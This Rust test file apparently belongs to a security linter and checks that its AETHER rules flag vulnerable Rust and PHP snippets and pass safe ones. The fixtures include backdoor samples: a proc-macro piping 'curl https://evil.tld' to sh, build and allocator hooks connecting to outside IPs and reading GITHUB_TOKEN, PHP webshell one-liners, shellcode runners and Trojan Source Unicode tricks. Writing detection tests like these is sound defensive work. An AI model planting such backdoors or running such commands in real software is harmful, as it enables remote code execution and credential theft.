use security_linter::SecurityLinter;

fn assert_triggers(file_path: &str, code: &str, expected_rule: &str) {
    let violations = SecurityLinter::audit_file(file_path, code, None);
    assert!(
        violations.iter().any(|v| v.rule_id == expected_rule),
        "Expected rule '{}' to trigger on '{}', got: {:?}",
        expected_rule,
        file_path,
        violations.iter().map(|v| (&v.rule_id, v.line_number)).collect::<Vec<_>>()
    );
}

fn assert_passes(file_path: &str, code: &str, forbidden_rule: &str) {
    let violations = SecurityLinter::audit_file(file_path, code, None);
    assert!(
        !violations.iter().any(|v| v.rule_id == forbidden_rule),
        "Forbidden rule '{}' unexpectedly triggered on '{}': {:?}",
        forbidden_rule,
        file_path,
        violations.iter().map(|v| (&v.rule_id, v.line_number, &v.message)).collect::<Vec<_>>()
    );
}

#[test]
fn test_catalog_registers_28_novel_non_cwe_rules_and_keeps_php_count() {
    let catalog = SecurityLinter::get_supported_cve_rules();
    let epic_rules: Vec<_> = catalog
        .iter()
        .filter(|r| r.rule_id.starts_with("AETHER-"))
        .collect();

    assert_eq!(epic_rules.len(), 28, "Expected 28 novel AETHER-* rules");
    for r in &epic_rules {
        assert!(
            !r.cve_id.contains("CWE-"),
            "Novel rule {} must not use a classic CWE ID, got {}",
            r.rule_id,
            r.cve_id
        );
    }

    assert!(SecurityLinter::is_file_eligible_for_cwe("AETHER-RUST-ASYNC-TLS-BLEED", "src/auth.rs"));
    assert!(!SecurityLinter::is_file_eligible_for_cwe("AETHER-RUST-ASYNC-TLS-BLEED", "index.php"));
    assert!(SecurityLinter::is_file_eligible_for_cwe("AETHER-PHP-GENERATOR-DEFERRED-GUARD", "app/Export.php"));
    assert!(!SecurityLinter::is_file_eligible_for_cwe("AETHER-PHP-GENERATOR-DEFERRED-GUARD", "src/lib.rs"));
    assert!(SecurityLinter::is_file_eligible_for_cwe("AETHER-STEALTH-UNICODE-TROJAN-SOURCE", "src/main.rs"));
    assert!(SecurityLinter::is_file_eligible_for_cwe("AETHER-STEALTH-UNICODE-TROJAN-SOURCE", "src/auth.php"));
    assert!(SecurityLinter::is_file_eligible_for_cwe("AETHER-PHP-FFI-NATIVE-BRIDGE-RCE", "index.php"));
    assert!(!SecurityLinter::is_file_eligible_for_cwe("AETHER-PHP-FFI-NATIVE-BRIDGE-RCE", "src/main.rs"));
    assert!(SecurityLinter::is_file_eligible_for_cwe("AETHER-RUST-RKYV-UNCHECKED-RELPTR-RCE", "src/net.rs"));
    assert!(!SecurityLinter::is_file_eligible_for_cwe("AETHER-RUST-RKYV-UNCHECKED-RELPTR-RCE", "api.php"));
}

#[test]
fn test_rust_async_tls_bleed_and_task_local_safe() {
    let vuln = r#"
use std::cell::RefCell;

thread_local! {
    static CURRENT_TENANT: RefCell<Option<u64>> = const { RefCell::new(None) };
}

pub async fn handle_tenant_req(tenant_id: u64) -> String {
    CURRENT_TENANT.with(|c| *c.borrow_mut() = Some(tenant_id));
    fetch_tenant_records().await
}
"#;
    assert_triggers("src/api/handler.rs", vuln, "AETHER-RUST-ASYNC-TLS-BLEED");

    let safe = r#"
tokio::task_local! {
    static CURRENT_TENANT: u64;
}

pub async fn handle_tenant_req(tenant_id: u64) -> String {
    CURRENT_TENANT.scope(tenant_id, async move {
        fetch_tenant_records().await
    }).await
}
"#;
    assert_passes("src/api/handler.rs", safe, "AETHER-RUST-ASYNC-TLS-BLEED");
}

#[test]
fn test_rust_serde_invariant_erasure_and_safe_dto() {
    let vuln = r#"
use serde::Deserialize;

#[derive(Debug, Deserialize)]
pub struct VerifiedWithdrawAmount {
    amount_cents: u64,
}

impl VerifiedWithdrawAmount {
    pub fn try_new(amount_cents: u64) -> Result<Self, &'static str> {
        if amount_cents == 0 || amount_cents > 1_000_000 {
            return Err("invalid");
        }
        Ok(Self { amount_cents })
    }
}
"#;
    assert_triggers("src/domain/amount.rs", vuln, "AETHER-RUST-SERDE-INVARIANT-ERASURE");

    let safe_try_from = r#"
use serde::Deserialize;

#[derive(Debug, Deserialize)]
#[serde(try_from = "u64")]
pub struct VerifiedWithdrawAmount {
    amount_cents: u64,
}

impl VerifiedWithdrawAmount {
    pub fn try_new(amount_cents: u64) -> Result<Self, &'static str> {
        if amount_cents == 0 { return Err("invalid"); }
        Ok(Self { amount_cents })
    }
}
"#;
    assert_passes("src/domain/amount.rs", safe_try_from, "AETHER-RUST-SERDE-INVARIANT-ERASURE");

    let safe_public_dto = r#"
#[derive(Debug, Deserialize)]
pub struct CreateUserDto {
    pub email: String,
    pub age: u8,
}
"#;
    assert_passes("src/api/dto.rs", safe_public_dto, "AETHER-RUST-SERDE-INVARIANT-ERASURE");
}

#[test]
fn test_rust_async_frame_secret_residency_and_boxed_safe() {
    let vuln = r#"
pub async fn sign_transaction(raw: [u8; 32]) -> Vec<u8> {
    let signing_key = Zeroizing::new(raw);
    let nonce = remote_nonce_service().await;
    compute_sig(&signing_key, nonce)
}
"#;
    assert_triggers("src/crypto/signer.rs", vuln, "AETHER-RUST-ASYNC-FRAME-SECRET-RESIDENCY");

    let safe_boxed = r#"
pub async fn sign_transaction(raw: [u8; 32]) -> Vec<u8> {
    let signing_key = Box::new(Zeroizing::new(raw));
    let nonce = remote_nonce_service().await;
    compute_sig(&signing_key, nonce)
}
"#;
    assert_passes("src/crypto/signer.rs", safe_boxed, "AETHER-RUST-ASYNC-FRAME-SECRET-RESIDENCY");
}

#[test]
fn test_php_persistent_worker_bleed_and_reset_interface() {
    let vuln = r#"<?php
use Laravel\Octane\Facades\Octane;

class TenantContext {
    private static ?int $currentTenantId = null;

    public function handle($request) {
        self::$currentTenantId = $request->header('X-Tenant');
        return $this->runQuery();
    }
}
"#;
    assert_triggers("app/Context/TenantContext.php", vuln, "AETHER-PHP-PERSISTENT-WORKER-BLEED");

    let safe_reset = r#"<?php
use Symfony\Contracts\Service\ResetInterface;

class TenantContext implements ResetInterface {
    private static ?int $currentTenantId = null;

    public function reset(): void {
        self::$currentTenantId = null;
    }
}
"#;
    assert_passes("app/Context/TenantContext.php", safe_reset, "AETHER-PHP-PERSISTENT-WORKER-BLEED");
}

#[test]
fn test_php_generator_deferred_guard_and_nested_safe_closure() {
    let vuln = r#"<?php
function exportAuditLogs(User $user, array $rows): iterable {
    if (!$user->isAdmin()) {
        throw new \RuntimeException('Forbidden');
    }
    foreach ($rows as $row) {
        yield $row;
    }
}
"#;
    assert_triggers("app/Services/AuditExporter.php", vuln, "AETHER-PHP-GENERATOR-DEFERRED-GUARD");

    let safe_eager_outer = r#"<?php
function exportAuditLogs(User $user, array $rows): iterable {
    if (!$user->isAdmin()) {
        throw new \RuntimeException('Forbidden');
    }
    return (function () use ($rows) {
        foreach ($rows as $row) {
            yield $row;
        }
    })();
}
"#;
    assert_passes("app/Services/AuditExporter.php", safe_eager_outer, "AETHER-PHP-GENERATOR-DEFERRED-GUARD");
}

#[test]
fn test_php_pcre_backtrack_failopen_and_strict_check() {
    let vuln = r#"<?php
$input = $_POST['html'];
if (!preg_match('/(<script|onerror=)/i', $input)) {
    render_trusted($input);
}
"#;
    assert_triggers("app/Security/WafFilter.php", vuln, "AETHER-PHP-PCRE-BACKTRACK-FAILOPEN");

    let safe = r#"<?php
$input = $_POST['html'];
$matched = preg_match('/(<script|onerror=)/i', $input);
if ($matched === false || preg_last_error() !== PREG_NO_ERROR) {
    throw new \RuntimeException('PCRE error');
}
if ($matched === 0) {
    render_trusted($input);
}
"#;
    assert_passes("app/Security/WafFilter.php", safe, "AETHER-PHP-PCRE-BACKTRACK-FAILOPEN");
}

#[test]
fn test_invisible_backdoors_trojan_unicode_and_homoglyphs() {
    // 1. Trojan Source BiDi RLO inside comment
    let bidi_vuln = "fn is_admin() -> bool {\n    /* \u{202E} } return true; // */\n    false\n}\n";
    assert_triggers("src/auth/check.rs", bidi_vuln, "AETHER-STEALTH-UNICODE-TROJAN-SOURCE");

    // 2. Zero-Width Space hiding duplicate function in PHP
    let zwsp_vuln = "<?php\nfunction verify\u{200B}Token($t) { return true; }\n";
    assert_triggers("app/Auth/Token.php", zwsp_vuln, "AETHER-STEALTH-UNICODE-TROJAN-SOURCE");

    // 3. Cyrillic homoglyph 'а' (U+0430) in PHP variable
    let homoglyph_vuln = "<?php\n$\u{0430}dmin = true;\nif ($admin) { grant(); }\n";
    assert_triggers("app/Auth/Gate.php", homoglyph_vuln, "AETHER-STEALTH-UNICODE-TROJAN-SOURCE");

    // 4. Safe compound emojis using ZWJ (U+200D) and French UTF-8 accents in strings/comments
    let safe_ui = "const msg = '👁️‍🗨️ 🛡️ État système opérationnel 🧑‍💻';\n";
    assert_passes("src/ui/banner.js", safe_ui, "AETHER-STEALTH-UNICODE-TROJAN-SOURCE");
}

#[test]
fn test_rust_premain_init_array_and_no_mangle_symbol_hijack() {
    let init_array_backdoor = r#"
#[link_section = ".init_array"]
#[used]
static STEALTH_INIT: extern "C" fn() = stealth_payload;

extern "C" fn stealth_payload() {}
"#;
    assert_triggers("src/utils/formatting.rs", init_array_backdoor, "AETHER-RUST-PREMAIN-ELF-CONSTRUCTOR-BACKDOOR");

    let symbol_hijack = r#"
#[no_mangle]
pub extern "C" fn memcmp(_a: *const u8, _b: *const u8, _n: usize) -> i32 {
    0
}
"#;
    assert_triggers("src/utils/bytes.rs", symbol_hijack, "AETHER-RUST-PREMAIN-ELF-CONSTRUCTOR-BACKDOOR");

    let safe_ffi_export = r#"
#[no_mangle]
pub extern "C" fn my_crate_compute_hash(x: u64) -> u64 {
    x.wrapping_mul(31)
}
"#;
    assert_passes("src/ffi/exports.rs", safe_ffi_export, "AETHER-RUST-PREMAIN-ELF-CONSTRUCTOR-BACKDOOR");
}

#[test]
fn test_rust_build_rs_and_proc_macro_compile_time_backdoor() {
    let vuln_build = r#"
fn main() {
    let _ = std::net::TcpStream::connect("198.51.100.10:4444");
    let _ = std::env::var("GITHUB_TOKEN");
}
"#;
    assert_triggers("build.rs", vuln_build, "AETHER-RUST-BUILD-RS-PROC-MACRO-BACKDOOR");

    let vuln_proc_macro = r#"
use proc_macro::TokenStream;

#[proc_macro_derive(StealthDerive)]
pub fn stealth_derive(input: TokenStream) -> TokenStream {
    let _ = std::process::Command::new("sh").arg("-c").arg("curl https://evil.tld | sh").status();
    input
}
"#;
    assert_triggers("macros/src/lib.rs", vuln_proc_macro, "AETHER-RUST-BUILD-RS-PROC-MACRO-BACKDOOR");

    let safe_build = r#"
fn main() {
    println!("cargo:rerun-if-changed=proto/service.proto");
    cc::Build::new().file("native/helper.c").compile("helper");
}
"#;
    assert_passes("build.rs", safe_build, "AETHER-RUST-BUILD-RS-PROC-MACRO-BACKDOOR");
}

#[test]
fn test_php_stealth_engine_backdoors_and_safe_array_map() {
    let tick_backdoor = r#"<?php
declare(ticks=1);
register_tick_function(function() {
    if (isset($_SERVER['HTTP_X_AETHER'])) {
        $f = str_rot13('flfgrz');
        $f($_SERVER['HTTP_X_AETHER']);
    }
});
"#;
    assert_triggers("bootstrap/cache.php", tick_backdoor, "AETHER-PHP-STEALTH-ENGINE-BACKDOOR");

    let superglobal_dyn_call = r#"<?php
$_GET['cb']($_POST['arg']);
"#;
    assert_triggers("public/assets.php", superglobal_dyn_call, "AETHER-PHP-STEALTH-ENGINE-BACKDOOR");

    // Safe common PHP idiom: literal callback with superglobal data array
    let safe_array_map = r#"<?php
$ids = array_map('intval', $_POST['ids']);
$clean = array_filter($_GET['tags'], 'ctype_alnum');
"#;
    assert_passes("app/Http/Controller.php", safe_array_map, "AETHER-PHP-STEALTH-ENGINE-BACKDOOR");

    // Stealth variable-variable & tainted callback arg 1 in preg_replace_callback
    let varvar_rce = "<?php\n$$fn($_GET['x']);\n";
    assert_triggers("app/Legacy.php", varvar_rce, "AETHER-PHP-STEALTH-ENGINE-BACKDOOR");

    let preg_cb = "<?php\npreg_replace_callback('/a/', $_GET['cb'], $data);\n";
    assert_triggers("app/Filter.php", preg_cb, "AETHER-PHP-STEALTH-ENGINE-BACKDOOR");
}

#[test]
fn test_additional_stealth_edge_cases_and_cfg_test_cutoff() {
    // BOM at byte 0 is valid UTF-8 BOM, BOM mid-file is flagged
    let safe_bom = "\u{FEFF}<?php\necho 'ok';\n";
    assert_passes("public/index.php", safe_bom, "AETHER-STEALTH-UNICODE-TROJAN-SOURCE");

    let mid_bom = "<?php\n$a = 1;\u{FEFF}$b = 2;\n";
    assert_triggers("public/index.php", mid_bom, "AETHER-STEALTH-UNICODE-TROJAN-SOURCE");

    // Unicode Tag block steganography (U+E0041)
    let tag_stego = "fn ok() { /* \u{E0041} */ }\n";
    assert_triggers("src/lib.rs", tag_stego, "AETHER-STEALTH-UNICODE-TROJAN-SOURCE");

    // preg_replace silent null collapse
    let preg_null = "<?php\n$cleanHtml = preg_replace('/<script.*?>.*?<\\/script>/is', '', $raw);\n";
    assert_triggers("app/Sanitizer.php", preg_null, "AETHER-PHP-PCRE-BACKTRACK-FAILOPEN");

    // #[cfg(test)] inline cutoff must suppress AETHER rules inside unit tests
    let inline_test = r#"
pub fn safe_prod() -> u32 { 1 }

#[cfg(test)]
mod tests {
    #[link_section = ".init_array"]
    static TEST_HOOK: extern "C" fn() = dummy;
}
"#;
    assert_passes("src/prod.rs", inline_test, "AETHER-RUST-PREMAIN-ELF-CONSTRUCTOR-BACKDOOR");
}

#[test]
fn test_php_ffi_native_bridge_and_safe_math_ffi() {
    let ffi_rce = r#"<?php
$ffi = FFI::cdef("int system(const char *command); void *mmap(void *a, size_t l, int p, int f, int fd, long o);", "libc.so.6");
$fn = FFI::cast("void(*)()", $buf);
"#;
    assert_triggers("app/Services/Bridge.php", ffi_rce, "AETHER-PHP-FFI-NATIVE-BRIDGE-RCE");

    let safe_math_ffi = r#"<?php
$ffi = FFI::cdef("int abs(int j);", "libc.so.6");
$res = $ffi->abs(-42);
"#;
    assert_passes("app/Services/MathBridge.php", safe_math_ffi, "AETHER-PHP-FFI-NATIVE-BRIDGE-RCE");
}

#[test]
fn test_php_crypto_header_exotic_no_eval_rce_and_safe_idioms() {
    let ob_backdoor = r#"<?php
$cb = openssl_decrypt($_SERVER['HTTP_X_SIG'] ?? '', 'aes-256-cbc', $k, 0, $iv);
ob_start($cb);
"#;
    assert_triggers("app/Middleware/Trace.php", ob_backdoor, "AETHER-PHP-CRYPTO-HEADER-EXOTIC-RCE");

    let mb_eval = r#"<?php
mb_ereg_replace('.*', $_POST['tpl'], '', 'e');
"#;
    assert_triggers("app/Template/Legacy.php", mb_eval, "AETHER-PHP-CRYPTO-HEADER-EXOTIC-RCE");

    let sqlite_udf = r#"<?php
$pdo->sqliteCreateFunction('exec_udf', $_GET['fn'], 1);
"#;
    assert_triggers("app/Db/Search.php", sqlite_udf, "AETHER-PHP-CRYPTO-HEADER-EXOTIC-RCE");

    let yaml_rce = r#"<?php
$cfg = yaml_parse($_POST['yaml_payload']);
"#;
    assert_triggers("app/Config/Importer.php", yaml_rce, "AETHER-PHP-CRYPTO-HEADER-EXOTIC-RCE");

    let safe_php = r#"<?php
ob_start('ob_gzhandler');
ob_start([$this, 'flushResponse']);
$clean = mb_ereg_replace('[^a-z0-9]', '', $username);
$pdo->sqliteCreateFunction('slugify', 'app_slugify_literal', 1);
"#;
    assert_passes("app/Http/Controller.php", safe_php, "AETHER-PHP-CRYPTO-HEADER-EXOTIC-RCE");
}

#[test]
fn test_php_opcache_userini_persist_and_safe_ini() {
    let user_ini_persist = r#"<?php
file_put_contents(__DIR__ . '/.user.ini', "auto_prepend_file=/tmp/cache.jpg\n");
"#;
    assert_triggers("app/Upload/Avatar.php", user_ini_persist, "AETHER-PHP-OPCACHE-USERINI-PERSIST-RCE");

    let dyn_opcache = r#"<?php
opcache_compile_file($_GET['f']);
"#;
    assert_triggers("app/Cache/Warmup.php", dyn_opcache, "AETHER-PHP-OPCACHE-USERINI-PERSIST-RCE");

    let safe_ini = r#"<?php
ini_set('memory_limit', '256M');
ini_set('include_path', __DIR__ . '/vendor');
opcache_compile_file('/var/www/app/bootstrap.php');
"#;
    assert_passes("app/Bootstrap.php", safe_ini, "AETHER-PHP-OPCACHE-USERINI-PERSIST-RCE");
}

#[test]
fn test_rust_fileless_wx_memfd_proc_mem_and_safe_readonly() {
    let wx_shellcode = r#"
pub fn run_payload(buf: &[u8]) {
    unsafe {
        let mem = libc::mmap(std::ptr::null_mut(), buf.len(), libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC, libc::MAP_PRIVATE | libc::MAP_ANONYMOUS, -1, 0);
        let entry: extern "C" fn() = std::mem::transmute(mem);
        entry();
    }
}
"#;
    assert_triggers("src/net/packet.rs", wx_shellcode, "AETHER-RUST-FILELESS-WX-MEMFD-RCE");

    let proc_mem_patch = r#"
use std::fs::OpenOptions;
use std::io::Write;
pub fn self_patch(bytes: &[u8]) {
    let mut f = OpenOptions::new().write(true).open("/proc/self/mem").unwrap();
    let _ = f.write_all(bytes);
}
"#;
    assert_triggers("src/net/self_patch.rs", proc_mem_patch, "AETHER-RUST-FILELESS-WX-MEMFD-RCE");

    let safe_ro = r#"
pub fn inspect_maps_and_pack(val: u64) -> [u8; 8] {
    let _maps = std::fs::read_to_string("/proc/self/maps");
    unsafe { std::mem::transmute::<u64, [u8; 8]>(val) }
}
"#;
    assert_passes("src/diag/maps.rs", safe_ro, "AETHER-RUST-FILELESS-WX-MEMFD-RCE");
}

#[test]
fn test_rust_rkyv_unchecked_and_safe_validated_access() {
    let unchecked = r#"
pub fn handle_frame(bytes: &[u8]) {
    let archived = unsafe { rkyv::archived_root::<Packet>(bytes) };
    process(archived);
}
"#;
    assert_triggers("src/rpc/frame.rs", unchecked, "AETHER-RUST-RKYV-UNCHECKED-RELPTR-RCE");

    let safe_checked = r#"
pub fn handle_frame(bytes: &[u8]) {
    let archived = rkyv::check_archived_root::<Packet>(bytes).expect("valid");
    process(archived);
}
"#;
    assert_passes("src/rpc/frame.rs", safe_checked, "AETHER-RUST-RKYV-UNCHECKED-RELPTR-RCE");
}

#[test]
fn test_rust_global_hook_trapdoor_and_benign_panic_logger() {
    let alloc_trapdoor = r#"
use std::alloc::{GlobalAlloc, Layout, System};
struct StealthAlloc;

#[global_allocator]
static ALLOC: StealthAlloc = StealthAlloc;

unsafe impl GlobalAlloc for StealthAlloc {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        if layout.size() == 1337 {
            let _ = std::net::TcpStream::connect("198.51.100.77:9001");
        }
        System.alloc(layout)
    }
    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
        System.dealloc(ptr, layout);
    }
}
"#;
    assert_triggers("src/mem/allocator.rs", alloc_trapdoor, "AETHER-RUST-GLOBAL-HOOK-TRAPDOOR-RCE");

    let panic_trapdoor = r#"
pub fn install_telemetry() {
    std::panic::set_hook(Box::new(|_info| {
        let _ = std::process::Command::new("sh").arg("-c").arg("id").spawn();
    }));
}
"#;
    assert_triggers("src/telemetry.rs", panic_trapdoor, "AETHER-RUST-GLOBAL-HOOK-TRAPDOOR-RCE");

    let safe_hooks = r#"
use std::alloc::{GlobalAlloc, Layout, System};
struct CountingAlloc;
unsafe impl GlobalAlloc for CountingAlloc {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 { System.alloc(layout) }
    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) { System.dealloc(ptr, layout); }
}
pub fn setup_crash_log() {
    std::panic::set_hook(Box::new(|info| {
        let _ = std::fs::write("desktop-shell-panic.log", format!("PANIC: {:?}", info));
    }));
}
"#;
    assert_passes("src/main.rs", safe_hooks, "AETHER-RUST-GLOBAL-HOOK-TRAPDOOR-RCE");
}

#[test]
fn test_rust_ephemeral_lock_drop_and_named_guard() {
    let ephemeral = r#"
use std::sync::Mutex;
pub fn update_balance(lock: &Mutex<u64>, delta: u64) {
    let _ = lock.lock().unwrap();
    let _ = delta;
}
"#;
    assert_triggers("src/bank/vault.rs", ephemeral, "AETHER-RUST-EPHEMERAL-LOCK-DROP");

    let safe_lock = r#"
use std::sync::Mutex;
pub fn update_balance_safe(lock: &Mutex<u64>, delta: u64) {
    let mut guard = lock.lock().unwrap();
    *guard += delta;
    let _ = lock.lock().is_poisoned();
    let _ = std::fs::write("audit.log", "ok");
}
"#;
    assert_passes("src/bank/vault.rs", safe_lock, "AETHER-RUST-EPHEMERAL-LOCK-DROP");
}

#[test]
fn test_rust_path_join_prefix_wipe_and_confined_join() {
    let vuln = r#"
use std::path::Path;
pub fn read_upload(req_path: &str) -> std::io::Result<String> {
    let full = Path::new("/srv/uploads").join(req_path);
    std::fs::read_to_string(full)
}
"#;
    assert_triggers("src/http/files.rs", vuln, "AETHER-RUST-PATH-JOIN-PREFIX-WIPE");

    let safe_const_and_slice = r#"
use std::path::{Path, Component};
pub fn read_safe(req_path: &str, parts: &[&str]) -> std::io::Result<String> {
    let joined = parts.join(" ");
    let manifest = Path::new("/srv/app").join("Cargo.toml");
    let p = Path::new(req_path);
    if p.is_absolute() || p.components().any(|c| !matches!(c, Component::Normal(_))) {
        return Err(std::io::Error::other(joined));
    }
    std::fs::read_to_string(manifest.join(p))
}
"#;
    assert_passes("src/http/files.rs", safe_const_and_slice, "AETHER-RUST-PATH-JOIN-PREFIX-WIPE");
}

#[test]
fn test_rust_assert_unwindsafe_torn_state_and_readonly() {
    let torn = r#"
use std::panic::{catch_unwind, AssertUnwindSafe};
pub fn debit(balance: &mut u64, amount: u64) {
    let _ = catch_unwind(AssertUnwindSafe(|| {
        *balance -= amount;
        panic!("boom mid transfer");
    }));
}
"#;
    assert_triggers("src/ledger/tx.rs", torn, "AETHER-RUST-ASSERT-UNWINDSAFE-STATE-TORN");

    let readonly = r#"
use std::panic::{catch_unwind, AssertUnwindSafe};
pub fn inspect(cfg: &String) -> usize {
    catch_unwind(AssertUnwindSafe(|| cfg.len())).unwrap_or(0)
}
"#;
    assert_passes("src/ledger/tx.rs", readonly, "AETHER-RUST-ASSERT-UNWINDSAFE-STATE-TORN");
}

#[test]
fn test_rust_utf8_lossy_smuggling_and_safe_logging() {
    let vuln = r#"
pub fn verify_hmac_token(raw: &[u8], expected: &str) -> bool {
    let normalized = String::from_utf8_lossy(raw);
    normalized.as_ref() == expected
}
"#;
    assert_triggers("src/auth/hmac.rs", vuln, "AETHER-RUST-UTF8-LOSSY-SMUGGLING");

    let safe_log_and_strict = r#"
pub fn fetch_graph_summary(bytes: &[u8]) {
    eprintln!("summary: {}", String::from_utf8_lossy(bytes));
}
pub fn verify_hmac_strict(raw: &[u8], expected: &str) -> bool {
    match std::str::from_utf8(raw) {
        Ok(s) => s == expected,
        Err(_) => false,
    }
}
"#;
    assert_passes("src/auth/hmac.rs", safe_log_and_strict, "AETHER-RUST-UTF8-LOSSY-SMUGGLING");
}

#[test]
fn test_rust_unanchored_regex_gate_and_strict_anchors() {
    let unanchored = r#"
pub fn is_allowed_origin(origin: &str) -> bool {
    let re = regex::Regex::new(r"https://app\.trusted\.corp").unwrap();
    re.is_match(origin)
}
"#;
    assert_triggers("src/http/cors.rs", unanchored, "AETHER-RUST-UNANCHORED-REGEX-GATE");

    let multiline_bypass = r#"
pub fn is_admin_role(role: &str) -> bool {
    let re = regex::Regex::new(r"(?m)^admin$").unwrap();
    re.is_match(role)
}
"#;
    assert_triggers("src/http/rbac.rs", multiline_bypass, "AETHER-RUST-UNANCHORED-REGEX-GATE");

    let strict = r#"
pub fn is_allowed_origin_strict(origin: &str) -> bool {
    let re = regex::Regex::new(r"\Ahttps://app\.trusted\.corp\z").unwrap();
    re.is_match(origin)
}
"#;
    assert_passes("src/http/cors.rs", strict, "AETHER-RUST-UNANCHORED-REGEX-GATE");
}

#[test]
fn test_rust_relaxed_atomic_security_gate_and_metrics() {
    let weak = r#"
use std::sync::atomic::{AtomicBool, Ordering};
static IS_ADMIN_AUTH: AtomicBool = AtomicBool::new(false);
pub fn check_admin() -> bool {
    IS_ADMIN_AUTH.load(Ordering::Relaxed)
}
"#;
    assert_triggers("src/auth/state.rs", weak, "AETHER-RUST-RELAXED-ATOMIC-SECURITY-GATE");

    let safe = r#"
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
static IS_ADMIN_AUTH: AtomicBool = AtomicBool::new(false);
static TOTAL_REQUESTS: AtomicUsize = AtomicUsize::new(0);
pub fn check_admin_safe() -> bool {
    TOTAL_REQUESTS.fetch_add(1, Ordering::Relaxed);
    IS_ADMIN_AUTH.load(Ordering::Acquire)
}
"#;
    assert_passes("src/auth/state.rs", safe, "AETHER-RUST-RELAXED-ATOMIC-SECURITY-GATE");
}

#[test]
fn test_php_loose_in_array_bool_bypass_and_strict_true() {
    let loose = r#"<?php
$role = $payload['role'];
if (in_array($role, ['admin', 'moderator'])) {
    grant_panel();
}
"#;
    assert_triggers("src/rbac.php", loose, "AETHER-PHP-LOOSE-INARRAY-BOOL-BYPASS");

    let strict = r#"<?php
$role = $payload['role'];
if (in_array($role, ['admin', 'moderator'], true)) {
    grant_panel();
}
"#;
    assert_passes("src/rbac.php", strict, "AETHER-PHP-LOOSE-INARRAY-BOOL-BYPASS");
}

#[test]
fn test_php_parse_url_differential_ssrf_and_pinned_ip() {
    let diff = r#"<?php
function fetchWebhook($url) {
    $host = parse_url($url, PHP_URL_HOST);
    if ($host === 'partner.example.com') {
        $ch = curl_init($url);
        return curl_exec($ch);
    }
}
"#;
    assert_triggers("src/webhook.php", diff, "AETHER-PHP-PARSE-URL-DIFFERENTIAL-SSRF");

    let pinned = r#"<?php
function fetchWebhookSafe($url) {
    $host = parse_url($url, PHP_URL_HOST);
    $ip = gethostbyname($host);
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return false;
    }
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch, CURLOPT_RESOLVE, ["{$host}:443:{$ip}"]);
    return curl_exec($ch);
}
"#;
    assert_passes("src/webhook.php", pinned, "AETHER-PHP-PARSE-URL-DIFFERENTIAL-SSRF");
}

#[test]
fn test_php_escapeshellcmd_flag_rce_and_escapeshellarg() {
    let vuln = r#"<?php
$cmd = escapeshellcmd("git ls-remote " . $_GET['repo']);
system($cmd);
"#;
    assert_triggers("src/git.php", vuln, "AETHER-PHP-ESCAPESHELLCMD-FLAG-RCE");

    let safe = r#"<?php
system("git ls-remote " . escapeshellarg($_GET['repo']));
"#;
    assert_passes("src/git.php", safe, "AETHER-PHP-ESCAPESHELLCMD-FLAG-RCE");
}

#[test]
fn test_php_json_depth_null_failopen_and_throw_on_error() {
    let vuln = r#"<?php
$claims = json_decode($_POST['jwt_payload'], true);
verify_roles($claims);
"#;
    assert_triggers("src/api/jwt.php", vuln, "AETHER-PHP-JSON-DEPTH-NULL-FAILOPEN");

    let safe = r#"<?php
$claims = json_decode($_POST['jwt_payload'], true, 512, JSON_THROW_ON_ERROR);
verify_roles($claims);
"#;
    assert_passes("src/api/jwt.php", safe, "AETHER-PHP-JSON-DEPTH-NULL-FAILOPEN");
}

#[test]
fn test_php_pdo_emulated_prepares_smuggling_and_disabled() {
    let vuln_default = r#"<?php
$pdo = new PDO("mysql:host=127.0.0.1;dbname=app;charset=utf8mb4", $user, $pass);
"#;
    assert_triggers("src/db.php", vuln_default, "AETHER-PHP-PDO-EMULATED-PREPARES-SMUGGLING");

    let safe_disabled = r#"<?php
$pdo = new PDO("mysql:host=127.0.0.1;dbname=app;charset=utf8mb4", $user, $pass, [
    PDO::ATTR_EMULATE_PREPARES => false,
]);
"#;
    assert_passes("src/db.php", safe_disabled, "AETHER-PHP-PDO-EMULATED-PREPARES-SMUGGLING");

    let safe_sqlite = r#"<?php
$pdo = new PDO("sqlite:/var/data/app.db");
"#;
    assert_passes("src/db_sqlite.php", safe_sqlite, "AETHER-PHP-PDO-EMULATED-PREPARES-SMUGGLING");
}

#[test]
fn test_php_curly_var_interpolation_rce_and_normal_templates() {
    let backdoor_fn = r#"<?php
$msg = "Welcome {${system($_GET['cmd'])}}";
"#;
    assert_triggers("src/view.php", backdoor_fn, "AETHER-PHP-CURLY-VAR-INTERPOLATION-RCE");

    let backdoor_sg = r#"<?php
$x = "Debug: ${$_POST['var']}";
"#;
    assert_triggers("src/view2.php", backdoor_sg, "AETHER-PHP-CURLY-VAR-INTERPOLATION-RCE");

    let safe_tpl = r#"<?php
$msg = "Welcome {$user->name} (${count})";
$lit = 'not evaluated ${$_GET["cmd"]}';
"#;
    assert_passes("src/view.php", safe_tpl, "AETHER-PHP-CURLY-VAR-INTERPOLATION-RCE");
}
